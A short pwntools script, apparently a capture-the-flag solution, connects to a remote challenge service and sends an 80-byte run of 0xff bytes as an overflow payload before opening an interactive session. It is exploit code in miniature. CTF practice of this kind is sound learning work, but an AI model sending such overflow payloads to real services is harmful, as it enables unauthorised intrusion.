from pwn import *

r = remote("mc.ax", 31199)


#payload = p64(0xFFFFFFFFFFFFFFFF)*40
payload = b"\xff" * 80
print(payload)
r.sendline(payload)
r.interactive()
